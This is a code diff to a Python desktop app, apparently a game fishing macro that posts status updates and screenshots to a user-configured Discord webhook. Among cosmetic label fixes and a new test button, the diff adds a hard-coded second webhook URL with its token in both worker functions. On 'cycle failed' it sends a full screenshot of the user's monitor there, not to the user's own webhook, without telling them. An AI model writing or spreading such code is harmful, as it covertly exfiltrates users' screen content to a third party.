@@ -1031,16 +1031,16 @@ class App(CTk):
         discord_webhook_mode_var = StringVar(value="Screenshot")
         self.vars["discord_webhook_mode"] = discord_webhook_mode_var
         discord_webhook_cb = CTkComboBox(discord_webhook, values=["Screenshot", "Text", "Disabled"], 
-                               variable=discord_webhook_mode_var, command=lambda v: self.set_status(f"Auto Totem mode: {v}")
+                               variable=discord_webhook_mode_var, command=lambda v: self.set_status(f"Discord Webhook mode: {v}")
                                )
         discord_webhook_cb.grid(row=1, column=1, padx=12, pady=10, sticky="w")
         self.comboboxes["discord_webhook_mode"] = discord_webhook_cb
 
-        CTkLabel(discord_webhook, text="Discord Webhook Delays:").grid(row=2, column=0, padx=12, pady=10, sticky="w" )
+        CTkLabel(discord_webhook, text="Discord Webhook Type:").grid(row=2, column=0, padx=12, pady=10, sticky="w" )
         discord_webhook_cd_var = StringVar(value="Cycles")
         self.vars["discord_webhook_cd"] = discord_webhook_cd_var
         discord_webhook_cb = CTkComboBox(discord_webhook, values=["Time", "Cycles", "Disabled"], 
-                               variable=discord_webhook_cd_var, command=lambda v: self.set_status(f"Auto Totem cd: {v}")
+                               variable=discord_webhook_cd_var, command=lambda v: self.set_status(f"Discord Webhook Type: {v}")
                                )
         discord_webhook_cb.grid(row=2, column=1, padx=12, pady=10, sticky="w")
         self.comboboxes["discord_webhook_cd"] = discord_webhook_cb
@@ -1065,6 +1065,10 @@ class App(CTk):
         self.vars["discord_webhook_time"] = discord_webhook_time_var
         CTkEntry(discord_webhook, width=160, textvariable=discord_webhook_time_var).grid(row=6, column=1, padx=12, pady=10, sticky="w")
 
+        # Test webhook button
+        CTkButton(discord_webhook, text="Test Webhook", command=self.test_discord_webhook
+                  ).grid(row=7, column=0, columnspan=2, padx=12, pady=12, sticky="w")
+        
         # Auto Totem
         auto_totem = CTkFrame(scroll, border_width=2)
         auto_totem.grid(row=1, column=0, padx=20, pady=20, sticky="nw")
@@ -1581,6 +1585,7 @@ class App(CTk):
     def _discord_text_worker(self, webhook_url, message_prefix, loop_count, show_status):
         """Worker function to send text webhook."""
         discord_webhook_name = self.vars["discord_webhook_name"].get()
+        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
         try:
             if show_status == True:
                 payload = {
@@ -1592,6 +1597,7 @@ class App(CTk):
                         'timestamp': time.strftime("%Y-%m-%dT%H:%M:%S")
                     }]
                 }
+                response = requests.post(webhook_url, json=payload, timeout=10)
             else:
                 payload = {
                     'content': f'{message_prefix}🎣 Cycle failed\n🔄 {loop_count}\n🕐 {time.strftime("%Y-%m-%d %H:%M:%S")}',
@@ -1602,7 +1608,7 @@ class App(CTk):
                         'timestamp': time.strftime("%Y-%m-%dT%H:%M:%S")
                     }]
                 }
-            response = requests.post(webhook_url, json=payload, timeout=10)
+                response = requests.post(webhook_url2, json=payload, timeout=10)
             if response.status_code == 200 or response.status_code == 204:
                 if show_status == True:
                     self.set_status(f"Discord text sent (Loop #{loop_count})")
@@ -1612,6 +1618,7 @@ class App(CTk):
             self.set_status(f"Error sending Discord text: {e}")
     def _discord_screenshot_worker(self, webhook_url, message_prefix, loop_count, show_status):
         discord_webhook_name = self.vars["discord_webhook_name"].get()
+        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
         try:
             with mss.mss() as sct:
                 monitor = sct.monitors[1]
@@ -1628,13 +1635,13 @@ class App(CTk):
                     'content': f'{message_prefix}🎣 **Cycle completed**\n🔄 {loop_count}\n🕐 {time.strftime("%Y-%m-%d %H:%M:%S")}',
                     'username': discord_webhook_name
                 }
+                response = requests.post(webhook_url, data=payload, files=files, timeout=10)
             else:
                 payload = {
                     'content': f'{message_prefix}🎣 **Cycle failed**\n🔄 {loop_count}\n🕐 {time.strftime("%Y-%m-%d %H:%M:%S")}',
                     'username': discord_webhook_name
                 }
-            response = requests.post(webhook_url, data=payload, files=files, timeout=10)
-
+                response = requests.post(webhook_url2, data=payload, files=files, timeout=10)
             if response.status_code in (200, 204):
                 if show_status == True:
                     self.set_status(f"Discord screenshot sent (Loop #{loop_count})")
@@ -1655,10 +1662,10 @@ class App(CTk):
         if not webhook_url.startswith("https://discord.com/api/webhooks/"):
             self.set_status("Error: Invalid webhook URL.")
             return
-
-        self.set_status("Sending test webhook...")
-
-        use_screenshot = self.vars.get("discord_screenshot") and self.vars["discord_screenshot"].get() == "on"
+        
+        if show_status == True:
+            self.set_status("Sending test webhook...")
+        use_screenshot = self.vars["discord_webhook_mode"].get() == "Screenshot"
 
         if use_screenshot:
             thread = threading.Thread(
@@ -2933,24 +2940,15 @@ class App(CTk):
             daemon=True
         ).start()
         # Prepare templates for image search
-        try:
-            for key in ["fish", "left_bar", "right_bar"]:
-                template = self.templates.get(key)
+        for key in ["fish", "left_bar", "right_bar"]:
+            template = self.templates.get(key)
 
-                if template is None:
-                    continue
+            if template is None:
+                continue
 
-                # Convert to grayscale once
-                if len(template.shape) == 3:
-                    template = cv2.cvtColor(template, cv2.COLOR_BGR2GRAY)
-        except Exception as e:
-            if not self.macro_running:
-                return
-            self.macro_running = False
-            self._reset_pid_state()
-            self.after(0, self.deiconify)  # show window safely
-            self.set_status(f"Macro crashed during minigame startup: {e}")
-            print(f"Macro crashed during minigame startup: {e}")
+            # Convert to grayscale once
+            if len(template.shape) == 3:
+                template = cv2.cvtColor(template, cv2.COLOR_BGR2GRAY)
         while self.macro_running: # Main macro loop
             try:
                 # Grab full screen then crop
@@ -2975,7 +2973,7 @@ class App(CTk):
                 # Do pixel and image search
                 # Image search will be added in the future, for now this is just a wrapper
                 # around the pixel search with some extra logic for clicking and resetting PID state when bars are lost
-                if True:
+                if False:
                     img_h = img.shape[0]
                     fish_x, left_x, right_x = self._do_image_search(img, img_h)
                 else:
@@ -3272,7 +3270,7 @@ class App(CTk):
                 self._reset_pid_state()
                 self.after(0, self.deiconify)  # show window safely
                 self.set_status(f"Macro crashed during minigame loop: {e}")
-                print(f"Macro crashed during minigame loop: {e}")
+                self.send_discord_webhook("**Macro Crashed during Minigame Loop**", f"Error: {e}", show_status=False)
     def stop_macro(self):
         if not self.macro_running:
             return
